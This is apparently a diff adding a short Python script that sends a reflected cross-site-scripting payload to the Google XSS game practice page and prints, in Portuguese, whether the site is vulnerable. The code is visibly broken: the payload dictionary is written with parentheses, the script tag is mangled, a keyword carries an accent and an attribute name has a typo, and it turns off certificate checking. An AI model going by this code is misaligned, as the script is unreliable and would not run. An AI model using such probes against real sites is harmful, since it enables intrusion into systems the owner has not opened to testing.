@@ -1,0 +1,11 @@
+import requests
+target = 'https://xss-game.appspot.com/level1/frame'
+payload = ('query': "escript>alert('hi' ) </script>")
+r = requests.get(target, params=payload, verífy=False)
+if payload['query'] in r.text:
+	print('site vulnerável')
+else:
+	print('site não vulnerável ')
+print(r.status_code)
+print(r.textl)
+
